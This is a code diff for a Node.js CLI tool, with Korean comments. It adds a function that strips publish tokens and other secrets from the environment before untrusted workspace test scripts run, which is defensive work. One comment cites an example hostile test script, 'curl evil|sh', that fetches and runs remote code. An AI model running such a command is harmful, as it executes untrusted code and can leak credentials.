@@ -12,7 +12,7 @@ const { _isSecretKey, compareVer, parseHarnessVersion, _classifyCJK, _riskLabel,
 // 1.9.295 (UR-0025 4단계): 정적 데이터 카탈로그 모듈 분리 (비파괴, require-based).
 const { CAPABILITY_SURFACE, POWERFUL_COMMANDS, ADAPTERS, REUSE_CATEGORIES, REUSE_CHECKLIST } = require('../lib/catalogs');
 
-const VERSION = '1.9.298';
+const VERSION = '1.9.299';
 
 // 1.9.290 (UR-0037, Codex gpt-5.5 #4 수렴): CLI 전용 부작용은 require 시 실행하지 않는다.
 //   이전: warning listener 제거 / NODE_OPTIONS 변경 / chcp IIFE 가 top-level 즉시 실행 → require('harness') 시 호스트 프로세스 오염.
@@ -3034,6 +3034,7 @@ function _selfTestCases() {
     { name: 'about: 정체성 verb(AI 운영 레이어) + MCP leerness_about 등록 (UR-0030 1.9.296)', run: () => { const id = _leernessIdentity(); const src = read(__filename); return typeof aboutCmd === 'function' && /운영 레이어/.test(id.identity) && id.layers.length === 5 && id.surface.mcpTools >= 81 && require('../lib/mcp-tools').some(t => t.name === 'leerness_about') && /case 'leerness_about':/.test(src) && /cmd === 'about' \|\| cmd === 'identity'/.test(src); } },
     { name: 'lib/mcp-tools: MCP 도구 정의 모듈 단일출처 (_mcpToolCount=모듈 length, Codex #5 영구해소) (UR-0025 1.9.297)', run: () => { const T = require('../lib/mcp-tools'); return Array.isArray(T) && T.length >= 81 && T.every(t => t.name && t.description && t.inputSchema) && T[0].name === 'leerness_handoff' && _mcpToolCount() === T.length && !/const TOOLS = \[/.test(read(__filename)); } },
     { name: 'writeUtf8: 원자적 쓰기(temp→rename) 손상방지 (UR-0038 외부리뷰 3중수렴 1.9.298)', run: () => { const src = read(__filename); return /function writeUtf8\(p, s\)/.test(src) && /fs\.writeFileSync\(tmp,/.test(src) && /fs\.renameSync\(tmp, p\)/.test(src) && /\.tmp-\$\{process\.pid\}/.test(src) && /fs\.unlinkSync\(tmp\)/.test(src); } },
+    { name: '_scrubTestEnv: npm test 시크릿 차단(_scrubEnv는 release 토큰 유지) (UR-0039 외부리뷰 1.9.299)', run: () => { const o = { N: process.env.NPM_TOKEN, L: process.env.LEERNESS_NPM_TOKEN }; process.env.NPM_TOKEN = 'sec1'; process.env.LEERNESS_NPM_TOKEN = 'sec2'; const base = _scrubEnv(); const test = _scrubTestEnv(); const r = base.NPM_TOKEN === 'sec1' && base.LEERNESS_NPM_TOKEN === 'sec2' && !test.NPM_TOKEN && !test.LEERNESS_NPM_TOKEN && !!test.PATH; if (o.N === undefined) delete process.env.NPM_TOKEN; else process.env.NPM_TOKEN = o.N; if (o.L === undefined) delete process.env.LEERNESS_NPM_TOKEN; else process.env.LEERNESS_NPM_TOKEN = o.L; return r; } },
     { name: 'VERSION 형식 (x.y.z)', run: () => /^\d+\.\d+\.\d+$/.test(VERSION) }
   ];
 }
@@ -9472,7 +9473,8 @@ function verifyClaimCmd(root, taskId) {
       if (!hasTestScript) {
         runResult = { skipped: true, reason: 'scripts.test 없음' };
       } else {
-        const r = cp.spawnSync('npm test', [], { cwd: root, encoding: 'utf8', shell: true, timeout: 5 * 60 * 1000 });
+        // 1.9.299 (UR-0039): 신뢰 못 할 워크스페이스 npm test → runCommandSafe + scrubSecrets (시크릿 노출 차단 + cwd jail).
+        const r = runCommandSafe('npm test', [], { cwd: root, root, encoding: 'utf8', allowShell: true, scrubSecrets: true, timeout: 5 * 60 * 1000, kind: 'verify_claim_test' });
         const out = (r.stdout || '') + (r.stderr || '');
         // 1.9.20: 파싱 패턴 확장 — 한국어 + jest/mocha/tap/vitest
         let parsed = null;
@@ -10047,7 +10049,8 @@ function depsImpactCmd(root, targetCapability) {
       try { pkg = JSON.parse(read(pkgPath)); } catch {}
       if (!pkg?.scripts?.test) { log(`  ⚠ ${projName}: scripts.test 없음 — skip`); continue; }
       const t0 = Date.now();
-      const r = cp.spawnSync('npm test', [], { cwd: projPath, encoding: 'utf8', shell: true, timeout: 5 * 60 * 1000 });
+      // 1.9.299 (UR-0039): 영향 프로젝트 npm test → runCommandSafe + scrubSecrets (시크릿 노출 차단). root=projPath 라 cwd jail 통과.
+      const r = runCommandSafe('npm test', [], { cwd: projPath, root: projPath, encoding: 'utf8', allowShell: true, scrubSecrets: true, timeout: 5 * 60 * 1000, kind: 'reuse_impact_test' });
       const elapsed = Date.now() - t0;
       const out = (r.stdout || '') + (r.stderr || '');
       const m = out.match(/(\d+)\s*\/\s*(\d+)\s*(?:passed|통과|pass|passing)/i);
@@ -14681,7 +14684,8 @@ function verifyCodeCmd(root) {
     log(`\n## ${t.name}: ${t.cmd}`);
     const start = Date.now();
     // 1.9.150: runCommandSafe — cwd jail + env scrub + observability 자동 (shell:true 유지 — npm/pytest 호환)
-    const r = runCommandSafe(t.cmd, [], { cwd: root, root, timeout: 5 * 60 * 1000, allowShell: true, kind: 'verify_code_task', label: `verify-${t.name}` });
+    // 1.9.299 (UR-0039): scrubSecrets — 신뢰 못 할 워크스페이스 test/build 스크립트에 publish 토큰/시크릿 노출 차단.
+    const r = runCommandSafe(t.cmd, [], { cwd: root, root, timeout: 5 * 60 * 1000, allowShell: true, scrubSecrets: true, kind: 'verify_code_task', label: `verify-${t.name}` });
     const dur = Date.now() - start;
     if (r.status === 0) ok(`${t.name} passed (${dur}ms)`);
     else if (t.optional && r.status === 127) warn(`${t.name} 스킵 (${t.cmd} 없음)`);
@@ -17653,6 +17657,14 @@ function _scrubEnv(extraEnv) {
   }
   return out;
 }
+// 1.9.299 (UR-0039, 외부리뷰 3중수렴): 신뢰 못 할 워크스페이스 스크립트(npm test 등) 실행용 — _scrubEnv 결과에서 시크릿 키까지 제거.
+//   _scrubEnv 는 release/publish 호환을 위해 GITHUB_TOKEN/NPM_TOKEN/GH_TOKEN/LEERNESS_*(LEERNESS_NPM_TOKEN 포함)를 통과시키나,
+//   임의 package.json "test" 스크립트(예: "test":"curl evil|sh")엔 토큰 노출 금지. _isSecretKey(단일 출처)로 시크릿 키 일괄 제거.
+function _scrubTestEnv(extraEnv) {
+  const out = _scrubEnv(extraEnv);
+  for (const k of Object.keys(out)) { if (_isSecretKey(k)) delete out[k]; }
+  return out;
+}
 function _isCwdSafe(root, cwd) {
   try {
     if (!cwd) return true;
@@ -17702,7 +17714,8 @@ function runCommandSafe(cmd, args, opts) {
     encoding: opts.encoding || 'utf8',
     timeout,
     shell: useShell,
-    env: _scrubEnv(opts.env),
+    // 1.9.299 (UR-0039): scrubSecrets=true 시 시크릿 키까지 제거(신뢰 못 할 npm test 실행). 기본은 _scrubEnv(release/publish 토큰 유지).
+    env: opts.scrubSecrets ? _scrubTestEnv(opts.env) : _scrubEnv(opts.env),
     input: opts.input,
     stdio: opts.stdio || 'pipe'
   };
